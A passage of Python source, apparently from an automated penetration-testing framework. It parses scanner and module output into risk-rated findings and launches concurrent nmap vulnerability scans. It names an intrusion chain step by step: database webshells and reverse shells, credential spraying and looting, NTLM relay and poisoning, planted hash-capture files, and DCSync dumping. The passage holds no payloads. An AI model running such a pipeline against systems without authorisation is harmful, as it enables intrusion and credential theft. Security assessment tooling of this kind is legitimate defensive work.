            vcve = ",".join(sorted(set(re.findall(r"CVE-\d{4}-\d{3,7}", " ".join(vulns))))) or None
            return {"state": "VULNERABLE", "cve": vcve, "risk": "CRITICAL",
                    "summary": f"SSH: {vulns[0]}"[:140]}
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": f"SSH: {mv.group(1).strip()}"[:140]}
        return None

    # 2bm) mssql-banner: unauthenticated version disclosure (info)
    if sid == "mssql-banner":
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": f"MSSQL: {mv.group(1).strip()}"[:140]}
        return None

    # 2bl) mysql-shell: a reverse shell was fired through the OUTFILE webshell
    if sid == "mysql-shell":
        if "shell → " in output:
            mm = re.search(r"shell → (.+)$", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"MySQL foothold — {mm.group(1).strip()}"[:140]}
        return None

    # 2bk) mysql-rce: INTO OUTFILE webshell → confirmed command execution
    if sid == "mysql-rce":
        if re.search(r"^✗ RCE ", output, re.M):
            mu = re.search(r"^✗ RCE (\S+)", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"MySQL RCE: webshell {mu.group(1)}"[:140]}
        return None

    # 2bj) mysql-loot: app creds > user hashes / file-read > db inventory
    if sid == "mysql-loot":
        appc = re.findall(r"^✗ CRED (.+)$", output, re.M)
        hashes = re.findall(r"^✗ HASH ", output, re.M)
        fread = re.search(r"^✗ FILE-READ ", output, re.M)
        dbs = re.findall(r"^· DB ", output, re.M)
        if appc:
            shown = "; ".join(c.strip() for c in appc[:2]) + (f" +{len(appc) - 2}" if len(appc) > 2 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"MySQL app creds: {shown}"[:140]}
        if hashes or fread:
            bits = []
            if hashes:
                bits.append(f"{len(hashes)} mysql.user hash(es)")
            if fread:
                bits.append("LOAD_FILE /etc/passwd")
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"MySQL loot: {', '.join(bits)}"[:140]}
        if dbs:
            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                    "summary": f"MySQL: {len(dbs)} non-system database(s) readable"[:140]}
        return None

    # 2bi) mysql-creds: default/reused login or CVE-2012-2122 bypass → DB access
    if sid == "mysql-creds":
        if re.search(r"^✗ BYPASS ", output, re.M):
            return {"state": "VULNERABLE", "cve": "CVE-2012-2122", "risk": "CRITICAL",
                    "summary": "MySQL auth bypass (CVE-2012-2122) — root without a password"[:140]}
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"MySQL creds: {shown}"[:140]}

    # 2bh) mysql-banner: unauthenticated version disclosure (info)
    if sid == "mysql-banner":
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": f"MySQL: {mv.group(1).strip()}"[:140]}
        return None

    # 2bc6) rdp-shell: an interactive RDP desktop session was spawned
    if sid == "rdp-shell":
        if "desktop → " in output:
            mm = re.search(r"desktop → (.+)$", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"RDP foothold — {mm.group(1).strip()}"[:140]}
        return None

    # 2bc5) rdp-creds: a reused/known cred authenticates over RDP (local admin → critical)
    if sid == "rdp-creds":
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        risk = "CRITICAL" if "local admin" in output else "HIGH"
        return {"state": "VULNERABLE", "cve": cve, "risk": risk,
                "summary": f"RDP creds: {'; '.join(h.strip() for h in hits[:3])}"[:140]}

    # 2bc4) rdp-enum: MS12-020 / weak Standard-RDP-Security (exposed) → else info
    if sid == "rdp-enum":
        if re.search(r"^✗ MS12-020", output, re.M):
            return {"state": "VULNERABLE", "cve": "CVE-2012-0002", "risk": "HIGH",
                    "summary": "RDP MS12-020 (CVE-2012-0002) — pre-auth RCE/DoS"[:140]}
        if re.search(r"^✗ WEAK ", output, re.M):
            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                    "summary": "RDP: Standard RDP Security (no NLA) — credential MITM surface"[:140]}
        mv = re.search(r"^· host:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"RDP: {mv.group(1).strip()}"[:140]}
        return None

    # 2bc3) vnc-shell: a VNC desktop session was spawned
    if sid == "vnc-shell":
        if "desktop → " in output:
            mm = re.search(r"desktop → (.+)$", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"VNC foothold — {mm.group(1).strip()}"[:140]}
        return None

    # 2bc2) vnc-creds: a weak/reused VNC password worked
    if sid == "vnc-creds":
        if re.search(r"^✗ NOAUTH", output, re.M):
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": "VNC: open desktop, no password required"[:140]}
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"VNC password: {'; '.join(h.strip() for h in hits[:3])}"[:140]}

    # 2bc1) vnc-enum: 'None' security type = open desktop (critical) → else info
    if sid == "vnc-enum":
        if re.search(r"^✗ NOAUTH", output, re.M):
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": "VNC: 'None' security type — desktop open with no auth"[:140]}
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"VNC: {mv.group(1).strip()}"[:140]}
        return None

    # 2bd3) mongo-loot: credential-like fields dumped from collections
    if sid == "mongo-loot":
        creds = re.findall(r"^✗ CRED (.+)$", output, re.M)
        colls = re.findall(r"^· coll ", output, re.M)
        if creds:
            shown = "; ".join(c.strip() for c in creds[:2]) + (f" +{len(creds) - 2}" if len(creds) > 2 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"MongoDB creds: {shown}"[:140]}
        if colls:
            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                    "summary": f"MongoDB: {len(colls)} collection(s) readable unauthenticated"[:140]}
        return None

    # 2bd2) mongo-auth: default/reused login worked (or no auth needed)
    if sid == "mongo-auth":
        if re.search(r"^✗ UNAUTH", output, re.M):
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": "MongoDB: no authentication required (remote read)"[:140]}
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"MongoDB creds: {'; '.join(h.strip() for h in hits[:3])}"[:140]}

    # 2bd1) mongo-info: unauthenticated MongoDB (exposed) → else version disclosure (info)
    if sid == "mongo-info":
        if re.search(r"^✗ UNAUTH", output, re.M):
            mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"MongoDB unauthenticated: {(mv.group(1).strip() if mv else 'remote read')}"[:140]}
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"MongoDB: {mv.group(1).strip()}"[:140]}
        return None

    # 2be6) redis-shell: reverse shell fired through the CONFIG-SET webshell
    if sid == "redis-shell":
        if "shell → " in output:
            mm = re.search(r"shell → (.+)$", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"Redis foothold — {mm.group(1).strip()}"[:140]}
        return None

    # 2be5) redis-rce: CONFIG SET dir/dbfilename webshell → confirmed command execution
    if sid == "redis-rce":
        mu = re.search(r"^✗ RCE (\S+)", output, re.M)
        if mu:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"Redis RCE: webshell {mu.group(1)}"[:140]}
        return None

    # 2be4) redis-loot: leaked requirepass/masterauth or dumped key values
    if sid == "redis-loot":
        secrets = re.findall(r"^✗ SECRET (.+)$", output, re.M)
        keys = re.findall(r"^✗ KEY ", output, re.M)
        if secrets:
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"Redis secret: {'; '.join(s.strip() for s in secrets[:2])}"[:140]}
        if keys:
            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                    "summary": f"Redis: {len(keys)} key value(s) dumped (creds/sessions)"[:140]}
        return None

    # 2be3) redis-auth: a default/reused password (or unauth) unlocked Redis
    if sid == "redis-auth":
        if re.search(r"^✗ UNAUTH", output, re.M):
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": "Redis: no authentication required (remote read/write)"[:140]}
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"Redis auth: {'; '.join(h.strip() for h in hits[:3])}"[:140]}

    # 2be2) redis-info: unauthenticated Redis (exposed) → else version disclosure (info)
    if sid == "redis-probe":
        if re.search(r"^✗ UNAUTH", output, re.M):
            mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"Redis unauthenticated: {(mv.group(1).strip() if mv else 'remote read/write')}"[:140]}
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"Redis: {mv.group(1).strip()}"[:140]}
        return None

    # 2bf3) krb-spray: Kerberos pre-auth spray validated a domain cred
    if sid == "krb-spray":
        hits = re.findall(r"^✗ CREDS (.+?)  \(Kerberos", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"Kerberos creds: {shown}"[:140]}

    # 2bf2) krb-roast: AS-REP / Kerberoast hashes harvested over port 88
    if sid == "krb-roast":
        asrep = re.findall(r"^✗ ASREP ", output, re.M)
        tgs = re.findall(r"^✗ TGS ", output, re.M)
        if not (asrep or tgs):
            return None
        bits = []
        if asrep:
            bits.append(f"{len(asrep)} AS-REP")
        if tgs:
            bits.append(f"{len(tgs)} Kerberoast")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"Kerberos roastable: {', '.join(bits)}"[:140]}

    # 2bf1) krb-enum: valid AD users enumerated without credentials
    if sid == "krb-enum":
        users = re.findall(r"^✗ USER (\S+)", output, re.M)
        if not users:
            return None
        return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                "summary": f"Kerberos: {len(users)} valid AD user(s) enumerated ({', '.join(users[:4])})"[:140]}

    # 2bg4) oracle-creds: default/reused account worked → DB access (DBA flagged)
    if sid == "oracle-creds":
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        risk = "CRITICAL" if "(DBA)" in output else "HIGH"
        return {"state": "VULNERABLE", "cve": cve, "risk": risk,
                "summary": f"Oracle creds: {shown}"[:140]}

    # 2bg3) oracle-sid: SID / service name discovered (needed to attack)
    if sid == "oracle-sid":
        sids = re.findall(r"^✗ SID (\S+)", output, re.M)
        if not sids:
            return None
        return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                "summary": f"Oracle SID(s): {', '.join(sids[:6])}"[:140]}

    # 2bg2) oracle-tns: unauthenticated status leak (exposed) → else version disclosure (info)
    if sid == "oracle-tns":
        if re.search(r"^✗ STATUS leak", output, re.M):
            ml = re.search(r"exposed unauthenticated:\s*(.+)$", output, re.M)
            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                    "summary": f"Oracle TNS status leak: {(ml.group(1) if ml else '').strip()}"[:140]}
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": f"Oracle: {mv.group(1).strip()}"[:140]}
        return None

    # 2bh6) psql-shell: a reverse shell was fired through COPY … FROM PROGRAM
    if sid == "psql-shell":
        if "shell → " in output:
            mm = re.search(r"shell → (.+)$", output, re.M)
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"PostgreSQL foothold — {mm.group(1).strip()}"[:140]}
        return None

    # 2bh5) psql-rce: COPY … FROM PROGRAM → confirmed command execution
    if sid == "psql-rce":
        if re.search(r"^✗ RCE ", output, re.M):
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": "PostgreSQL RCE: COPY … FROM PROGRAM command exec"[:140]}
        return None

    # 2bh4) psql-loot: app creds > pg_shadow hashes / file-read > db inventory
    if sid == "psql-loot":
        appc = re.findall(r"^✗ CRED (.+)$", output, re.M)
        hashes = re.findall(r"^✗ HASH ", output, re.M)
        fread = re.search(r"^✗ FILE-READ ", output, re.M)
        dbs = re.findall(r"^· DB ", output, re.M)
        if appc:
            shown = "; ".join(c.strip() for c in appc[:2]) + (f" +{len(appc) - 2}" if len(appc) > 2 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"PostgreSQL app creds: {shown}"[:140]}
        if hashes or fread:
            bits = []
            if hashes:
                bits.append(f"{len(hashes)} pg_shadow hash(es)")
            if fread:
                bits.append("pg_read_file /etc/passwd")
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"PostgreSQL loot: {', '.join(bits)}"[:140]}
        if dbs:
            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                    "summary": f"PostgreSQL: {len(dbs)} non-system database(s) readable"[:140]}
        return None

    # 2bh3) psql-creds: default/reused login → DB access (superuser flagged)
    if sid == "psql-creds":
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        risk = "CRITICAL" if "(superuser)" in output else "HIGH"
        return {"state": "VULNERABLE", "cve": cve, "risk": risk,
                "summary": f"PostgreSQL creds: {shown}"[:140]}

    # 2bh2) psql-banner: trust auth (weakness) → else auth method / version disclosure (info)
    if sid == "psql-banner":
        if re.search(r"^✗ TRUST ", output, re.M):
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": "PostgreSQL trust auth — 'postgres' needs no password"[:140]}
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": f"PostgreSQL: {mv.group(1).strip()}"[:140]}
        ma = re.search(r"^\[\*\] Auth method:\s*(.+)$", output, re.M)
        if ma:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": f"PostgreSQL: auth {ma.group(1).strip()}"[:140]}
        return None

    # 2bg) telnet-sniff: cleartext telnet creds captured off the wire
    if sid == "telnet-sniff":
        hits = re.findall(r"^✗ SNIFF (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"telnet cleartext sniffed: {shown}"[:140]}

    # 2be) telnet-creds: default / reused telnet login worked → immediate access
    if sid == "telnet-creds":
        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"telnet creds: {shown}"[:140]}

    # 2bd) telnet-banner: unauthenticated shell (critical) → else banner / auth-required info
    if sid == "telnet-banner":
        no = re.search(r"^✗ NOAUTH unauthenticated shell — (.+)$", output, re.M)
        if no:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"telnet: unauthenticated shell ({no.group(1)})"[:140]}
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": f"telnet: {mv.group(1).strip()}"[:140]}
        return None

    # 2bc) tftp-write: anonymous WRQ accepted — payload-drop / config-overwrite surface
    if sid == "tftp-write":
        w = re.findall(r"^✗ WRITABLE (\S+)", output, re.M)
        if not w:
            return None
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                "summary": f"anonymous-writable TFTP (no DELETE): {w[0]}"[:140]}

    # 2bb) tftp-grab: creds/secrets pulled from world-readable device configs & boot files
    if sid == "tftp-grab":
        creds = re.findall(r"^✗ CRED (.+)$", output, re.M)
        secrets = re.findall(r"^✗ SECRET (.+)$", output, re.M)
        files = re.findall(r"^· FILE ", output, re.M)
        if creds:
            shown = "; ".join(c.strip() for c in creds[:3]) + (f" +{len(creds) - 3}" if len(creds) > 3 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"TFTP config creds: {shown}"[:140]}
        if secrets:
            shown = "; ".join(s.strip() for s in secrets[:2]) + (f" +{len(secrets) - 2}" if len(secrets) > 2 else "")
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"TFTP config secrets: {shown}"[:140]}
        if files:
            return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                    "summary": f"TFTP: {len(files)} world-readable file(s) retrieved"[:140]}
        return None

    # 2ba) tftp-probe: path-traversal arbitrary read (critical) → else just a reachable TFTP server
    if sid == "tftp-probe":
        reads = re.findall(r"^✗ VULN arbitrary file read via path traversal — (.+?) readable$", output, re.M)
        if reads:
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"TFTP path-traversal read: {', '.join(reads[:4])}"[:140]}
        if "it's a TFTP server" in output:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": "TFTP/69 reachable — no auth, read/write primitive"[:140]}
        return None

    # 2at) ftp-banner: known-backdoor FTP version → critical RCE; else version info
    if sid == "ftp-banner":
        vulns = re.findall(r"^✗ VULN (.+)$", output, re.M)
        if vulns:
            vcve = ",".join(sorted(set(re.findall(r"CVE-\d{4}-\d{3,7}", " ".join(vulns))))) or None
            return {"state": "VULNERABLE", "cve": vcve, "risk": "CRITICAL",
                    "summary": f"FTP: {vulns[0]}"[:140]}
        mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
        if mv:
            return {"state": "INFO", "cve": None, "risk": "LOW",
                    "summary": f"FTP: {mv.group(1).strip()}"[:140]}
        return None

    # 2as) winrm-recon: post-access recon — hot privilege → privesc path; pivot subnets
    if sid == "winrm-recon":
        privs = re.findall(r"^✗ PRIV (\S+)", output, re.M)
        if privs:
            hot = any(p in _HOT_PRIVS for p in privs)
            shown = ", ".join(privs[:5])
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH" if hot else "MEDIUM",
                    "summary": f"WinRM privileges: {shown}"[:140]}
        if "Networks:" in output:
            return {"state": "INFO", "cve": cve, "risk": "LOW",
                    "summary": "WinRM post-access recon (pivot surface)"[:140]}
        return None

    # 2ar) winrm-access: enumerated who can use WinRM (Remote Management Users / admins)
    if sid == "winrm-access":
        hits = [h.replace("  (have cred)", "").strip()
                for h in re.findall(r"^✗ WINRM-USER (.+)$", output, re.M)]
        if not hits:
            return None
        shown = ", ".join(dict.fromkeys(hits))[:110]
        return {"state": "EXPOSED", "cve": cve, "risk": "MEDIUM",
                "summary": f"WinRM access: {shown}"[:140]}

    # 2aq) winrm-shell: an interactive evil-winrm session was spawned over a WinRM cred
    if sid == "winrm-shell":
        m = re.search(r"^winrm-shell: (evil-winrm shell → .+)$", output, re.M)
        if m:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"foothold — {m.group(1)}"[:140]}
        return None

    # 2ap) winrm-spray: harvested creds valid on WinRM (reuse); a shell (Pwn3d!) is critical
    if sid == "winrm-spray":
        shell = re.findall(r"^✗ SHELL (.+?)\s{2}", output, re.M)
        valid = re.findall(r"^✓ VALID (.+)$", output, re.M)
        if shell:
            shown = "; ".join(s.strip() for s in shell[:3]) + (f" +{len(shell) - 3}" if len(shell) > 3 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"WinRM shell: {shown}"[:140]}
        if valid:
            shown = "; ".join(v.strip() for v in valid[:3]) + (f" +{len(valid) - 3}" if len(valid) > 3 else "")
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"valid WinRM creds: {shown}"[:140]}
        return None

    # 2ao) winrm-enum: WinRM transport confirmed → evil-winrm target; Basic-over-HTTP is worse
    if sid == "winrm-enum":
        trans = re.findall(r"((?:HTTPS?) \d+) ✓", output)
        if not trans:
            return None
        auth = re.search(r"Auth:\s*(.+)", output)
        risk = "HIGH" if "Basic auth over HTTP" in output else "MEDIUM"
        summ = f"WinRM: {', '.join(trans)}" + (f" · auth {auth.group(1)}" if auth else "")
        return {"state": "EXPOSED", "cve": cve, "risk": risk, "summary": summ[:140]}

    # 2an) smb-foothold: an interactive admin session was spawned over valid creds / a hash
    if sid == "smb-foothold":
        m = re.search(r"^smb-foothold: (\S+ shell → .+)$", output, re.M)
        if m:
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"foothold — {m.group(1)}"[:140]}
        return None

    # 2am) smb-writable: hash-capture LNK planted on a writable share → coerces browsers
    if sid == "smb-writable":
        hits = re.findall(r"^✗ PLANT (.+)$", output, re.M)
        if not hits:
            return None
        shown = ", ".join(h.strip() for h in hits[:4]) + (f" +{len(hits) - 4}" if len(hits) > 4 else "")
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                "summary": f"writable share — hash-capture LNK planted: {shown}"[:140]}

    # 2al) smb-dump: credential material dumped (SAM/LSA/LSASS) or the domain (DCSync/NTDS)
    if sid == "smb-dump":
        dc = re.findall(r"^✗ DCSYNC (.+)$", output, re.M)
        du = re.findall(r"^✗ DUMP (.+)$", output, re.M)
        if dc:
            shown = "; ".join(d.strip() for d in dc[:2])
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"DCSync — domain dumped: {shown}"[:140]}
        if du:
            shown = "; ".join(d.strip() for d in du[:2]) + (f" +{len(du) - 2}" if len(du) > 2 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"creds dumped: {shown}"[:140]}
        return None

    # 2ak) smb-exec: command execution confirmed over admin creds → shell channel ready
    if sid == "smb-exec":
        hits = re.findall(r"^✗ EXEC (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                "summary": f"code exec: {shown}"[:140]}

    # 2aj) smb-spray: harvested creds valid elsewhere (reuse) → local admin is critical
    if sid == "smb-spray":
        admin = re.findall(r"^✗ ADMIN (.+?)\s{2}", output, re.M)
        valid = re.findall(r"^✓ VALID (.+)$", output, re.M)
        if admin:
            shown = "; ".join(a.strip() for a in admin[:3]) + (f" +{len(admin) - 3}" if len(admin) > 3 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                    "summary": f"local admin via reuse: {shown}"[:140]}
        if valid:
            shown = "; ".join(v.strip() for v in valid[:3]) + (f" +{len(valid) - 3}" if len(valid) > 3 else "")
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"valid creds (reuse): {shown}"[:140]}
        return None

    # 2ai) smb-dccve: confirmed DC-takeover CVE (ZeroLogon / noPac / PrintNightmare)
    if sid == "smb-dccve":
        hits = re.findall(r"^✗ VULN (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:4]) + (f" +{len(hits) - 4}" if len(hits) > 4 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                "summary": f"DC takeover: {shown}"[:140]}

    # 2ah) smb-coerce: target coercible into authenticating to us → drives the relay
    if sid == "smb-coerce":
        hits = re.findall(r"^✗ COERCE (.+)$", output, re.M)
        if not hits:
            return None
        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                "summary": f"coercible: {', '.join(h.strip() for h in hits[:5])}"[:140]}

    # 2ag) smb-relay: NTLM relayed to a signing-off host → SAM hashes dumped remotely
    if sid == "smb-relay":
        hits = re.findall(r"^✗ SAM (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
                "summary": f"NTLM relay → SAM: {shown}"[:140]}

    # 2af) smb-poison: NetNTLM hashes captured via LLMNR/NBT-NS poisoning → crack/relay
    if sid == "smb-poison":
        hits = re.findall(r"^✗ HASH (.+)$", output, re.M)
        if not hits:
            return None
        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                "summary": f"Captured NetNTLM: {shown}"[:140]}

    # 2ae) smb-gpp: creds recovered from SYSVOL/NETLOGON GPP (domain-wide, reusable) → high
    if sid == "smb-gpp":
        creds = re.findall(r"^✗ CRED (.+)$", output, re.M)
        secrets = re.findall(r"^✗ SECRET (.+)$", output, re.M)
        if creds:
            shown = "; ".join(c.strip() for c in creds[:3]) + (f" +{len(creds) - 3}" if len(creds) > 3 else "")
            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
                    "summary": f"GPP creds: {shown}"[:140]}
        if secrets:
            shown = "; ".join(s.strip() for s in secrets[:3]) + (f" +{len(secrets) - 3}" if len(secrets) > 3 else "")
            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
                    "summary": f"SYSVOL secrets: {shown}"[:140]}
        return None

    # 3) info rules over -sC output
    low = output.lower()
    info = None
    if sid == "http-git":
        info = ("exposed .git repository", "MEDIUM")
    elif sid == "http-config-backup":
        info = ("exposed config/backup file", "MEDIUM")
    elif sid == "http-methods" and re.search(r"\b(PUT|DELETE|TRACE|CONNECT)\b", output):
        info = ("risky HTTP methods enabled", "LOW")
    elif sid in ("http-title", "http-ls") and "index of /" in low:
        info = ("directory listing enabled", "LOW")
    elif sid == "ssl-enum-ciphers" and re.search(r"least strength:\s*[C-F]", output):
        info = ("weak TLS ciphers", "MEDIUM")
    elif sid in ("smb-security-mode", "smb2-security-mode") and "not required" in low:
        info = ("SMB message signing not required", "MEDIUM")
    elif sid == "ssh-auth-methods" and "password" in low:
        info = ("SSH password authentication enabled", "INFO")
    if info:
        return {"state": "INFO", "cve": cve, "risk": info[1], "summary": info[0]}
    return None


def _run_vuln_pass(job: dict, scripts: str, ports: list, ip: str, deadline: float) -> None:
    """Run one family's targeted vuln/auth scan, streaming script output (to scripts)
    and parsed findings (to vulns) to the DB. Honours job['cancel']."""
    args = ["-sV", "--script", scripts, "-Pn", "-n", "-T3",
            "--script-timeout", "120s", "-p", ",".join(str(p) for p in ports)]

    def _on_items(batch):
        for h in batch:
            if _is_self_ip(h["ip"]):
                continue
            if h.get("scripts"):
                save_scripts(h["ip"], h["scripts"])     # also extracts findings -> vulns
            if h.get("services"):
                save_services(h["ip"], h["services"])
            job["hosts"] = len(fetch_vulns(h["ip"]))     # count of findings so far
            _job_update(job)

    try:
        items, output = _run_nmap(args, [ip], _on_items, deadline=deadline,
                                  should_stop=job["cancel"].is_set,
                                  parse_elem=_host_detail_from_elem)
        job["output"] = output
        if items is None:
            job["state"], job["error"] = "error", "nmap not found"
        elif job["cancel"].is_set():
            job["state"] = "aborted"
        else:
            job["state"] = "done"
    except Exception as exc:
        job["state"], job["error"] = "error", str(exc)
    finally:
        _job_update(job)


def _run_vuln_scan(ip: str, minutes: int) -> None:
    """One concurrent targeted scan per service family, sharing one time budget."""
    _refresh_own_addresses()
    save_hosts([{"ip": ip}])
    deadline = max(1, minutes * 60)
    name = _PHASES["3"][0]
    families = _vuln_families(ip)
    if not families:
        job = _new_job("3", name, f"nmap (no known services on {ip})")
        job["state"] = "done"
        _job_update(job)
        return
    run = _next_run_id()
    threads = []
    for label, scripts, ports in families:
        command = f"nmap -sV --script {scripts} -T3 -p {','.join(str(p) for p in ports)} {ip}"
        job = _new_job("3", f"{name} · {label}", command, run)
        t = threading.Thread(target=_run_vuln_pass, args=(job, scripts, ports, ip, deadline),
                             daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _start_vuln_scan(ip: str, minutes: int) -> None:
    """Launch the vuln scan in the background; the menu stays free."""
    threading.Thread(target=_run_vuln_scan, args=(ip, minutes), daemon=True).start()


# ── CVE lookup (phase 5) ──────────────────────────────────────────────────────
# Offline enrichment: the service-detection phase stores a CPE per port; here we
# match that CPE (vendor/product + version) against the local NVD-derived index
# (appdata/cve_index.db) and record the known CVE numbers as findings. No network,
# no scanning — pure lookup. Only versioned CPEs are used (a general CPE without a
